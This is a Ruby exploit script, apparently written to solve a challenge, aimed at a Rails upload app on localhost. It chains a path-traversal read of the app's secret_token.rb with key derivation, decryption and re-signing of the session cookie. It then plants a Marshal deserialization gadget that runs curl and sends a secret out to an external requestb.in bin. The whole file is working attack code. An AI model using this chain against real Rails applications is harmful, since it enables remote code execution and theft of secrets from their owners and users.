#! /usr/bin/env ruby

require 'net/http'
require 'base64'
require 'openssl'
require 'cgi'
require 'active_support/deprecation'
require 'erb'
require 'json'
require 'mechanize'

# Silence stderr
$stderr = StringIO.new

# Get /config/initializers/secret_token.rb and parse the secret_key_base out of it
response = Net::HTTP.get_response(URI('http://localhost:3000/uploads/%2E%2E%2Fconfig%2Finitializers%2Fsecret_token.rb'))
secret_key_base = response.body.split('secret_key_base = ')[1].strip.gsub("'", '')

# Figure out the encryption key based on the secret_key_base
salt       = 'encrypted cookie'
iterations = 1000
key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, salt, iterations, 64)

# Get encrypted session data and iv
response = Net::HTTP.get_response(URI('http://localhost:3000'))
encoded_session_data = response['set-cookie'].match(/\A_ultimate-uploader_session=(.*)--.*\Z/).captures.first
encoded_session_data.gsub!('%3D', '=')
session_data = Base64.strict_decode64(encoded_session_data)

encoded_ciphertext, encoded_iv = session_data.split('--')
ciphertext, iv = Base64.strict_decode64(encoded_ciphertext), Base64.strict_decode64(encoded_iv)

# Decrypt the session data
plaintext = ''
OpenSSL::Cipher::Cipher.new('aes-256-cbc').tap do |c|
  c.decrypt
  c.key = key
  c.iv  = iv

  plaintext = c.update(ciphertext)
  plaintext << c.final
end

# Unserialize the session hash
session_hash = Marshal.load(plaintext)

# Create a request bin to get data out of the app
bin_name = JSON.parse(Net::HTTP.post_form(URI('http://requestb.in/api/v1/bins'), {}).body)['name']
bin_url = "http://requestb.in/#{bin_name}"
bin_inspect_url = "#{bin_url}?inspect"

# Mock out Secret.get so we don't get local errors
class Secret
  def self.get
    "LOCAL"
  end
end

# Inject our code into the session hash
erb = ERB.allocate
erb.instance_variable_set(:@src, '`curl -s "' + bin_url + '?secret=#{Secret.get}"`;')
proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
session_hash['proxy'] = proxy

# Re-encrypt the session data
plaintext = Marshal.dump(session_hash)
ciphertext, iv = '', ''
OpenSSL::Cipher::Cipher.new('aes-256-cbc').tap do |c|
  c.encrypt
  c.key = key
  iv = c.random_iv

  ciphertext = c.update(plaintext)
  ciphertext << c.final
end

session_payload = "#{Base64.strict_encode64(ciphertext)}--#{Base64.strict_encode64(iv)}"
encoded_session_payload = Base64.strict_encode64(session_payload)

# Figure out the signing secret
salt = 'signed encrypted cookie'
sign_secret = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, salt, iterations, 64)

# Sign the message
digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, sign_secret, encoded_session_payload)

# Assemble the session cookie
cookie = "_ultimate-uploader_session=#{CGI.escape(encoded_session_payload)}--#{digest}"

# Deliver it to the application
Net::HTTP.start('localhost', 3000) do |http|
  request = Net::HTTP::Get.new(URI('http://localhost:3000'))
  request['cookie'] = cookie

  response = http.request request
end

# Get the secret from the request bin
agent = Mechanize.new
agent.get(bin_inspect_url)
puts agent.page.search('.keypair').first.text.gsub('secret: ', '').gsub(' ', '+')
